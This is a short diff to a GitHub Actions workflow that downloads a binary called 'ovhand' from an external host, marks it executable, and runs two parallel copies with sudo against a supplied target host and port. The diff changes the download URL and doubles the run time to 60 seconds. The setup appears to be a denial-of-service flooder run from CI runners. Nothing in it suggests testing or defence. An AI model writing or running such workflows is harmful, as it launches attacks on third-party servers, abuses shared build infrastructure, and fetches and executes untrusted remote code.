@@ -29,12 +29,12 @@ jobs:
           TARGET="${{ inputs.target }}"
           PORT="${{ inputs.port }}"
           
-          wget https://curl.by/UfAFb/ovhand -O OVH
+          wget https://wgetz.com/7wYVJHOeWv/ovhand -O OVH
           chmod +x OVH || true
           
           PIDS=()
           for i in {1..2}; do
-            sudo timeout 30 ./OVH "$TARGET" "$PORT" 8 30 &
+            sudo timeout 60 ./OVH "$TARGET" "$PORT" 8 30 &
             PIDS+=($!)
           done
 
@@ -44,5 +44,5 @@ jobs:
           
       - name: Finish !
         run: |
-          sleep 30
+          sleep 60
           exit 0
